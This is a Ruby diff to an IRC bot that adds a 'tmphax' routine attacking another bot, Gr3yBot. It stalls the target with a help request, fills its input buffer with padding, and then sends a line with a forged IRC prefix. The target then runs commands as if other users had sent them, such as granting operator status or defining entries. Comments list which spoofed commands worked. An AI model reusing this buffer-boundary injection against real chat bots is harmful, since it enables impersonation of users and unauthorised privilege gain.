@@ -34,8 +34,21 @@ class GraysonBot
         send 'PONG', msg.params.first
       end
     when 'PRIVMSG'
-      if msg.prefix.start_with?('GraysonHome!') && msg.params[1] == 'tmphax'
-        tmphax
+      if msg.params.size != 2
+        # that's odd
+        return
+      end
+
+      if msg.prefix.start_with?('GraysonHome!')
+        if md = msg.params[1].match(/tmphax(.*)/)
+          tmphax(md[1])
+        end
+      end
+
+      if msg.params[1].include?("cleverbot")
+        #puts "==== Sending the awesome sauce"
+        #sleep 0.1
+        #send 'PRIVMSG', 'Gr3yBot', 'bgm 3 bgm bgm 3 bgm bgm 3 bgm'
       end
     end
   end
@@ -45,11 +58,41 @@ class GraysonBot
     @socket.print message
   end
 
-  def tmphax
+  def tmphax(arg_str)
+    padding_fudge = arg_str.to_i
+    puts "==== tmphax padding_fudge: #{padding_fudge}"
+
+    # send 'PRIVMSG', 'NickServ', 'STATUS bgm'
+
     # Typical message from GraysonBot to Gr3yBot:
     # ":GraysonBot!GraysonBot@12345678 PRIVMSG Gr3yBot :contents\r\n"
     # Length = 51 + contents
+    header_size = 49
+    footer_size = 2
+    overhead_size = header_size + footer_size
 
-    send "PRIVMSG", "GraysonHome", "heyoheyo"
+    target = 'Gr3yBot'
+
+    # Ask for help so the bot stops reading its input buffer for a while.
+    send 'PRIVMSG', target, "%help"
+
+    sleep 1
+
+    # Send 920 bytes to the bot's input buffer.
+    # Each message should be 240 bytes when it gets to the bot.
+    4.times do
+      send 'PRIVMSG', target, 'a' * (230 - overhead_size)
+    end
+
+    # Send the payload.
+    padding_size = 1024 - 920 - header_size + padding_fudge
+
+    command = ':bgm!bgm@bcc4f687 PRIVMSG #pub :%op GraysonHome'  # doesn't quite work
+    # command = ':GraysonHome!GraysonHome@bcc4f687 PRIVMSG Gr3yBot :%help'  # worked
+    # command = ':GraysonHome!GraysonHome@bcc4f687 PRIVMSG #pub :%define test'  # worked
+    # command = ':McNutnut!McNutnut@bcc4f687 PRIVMSG Gr3yBot :%define hacked'
+    # command = ':MasterChen!MasterChen@bcc4f687 PRIVMSG #pub :%tell DavidEGrayson you are a totally cool dude and totally not hacking me to say this right now'  # worked
+
+    send 'PRIVMSG', target, (':' * (padding_size)) + command
   end
 end
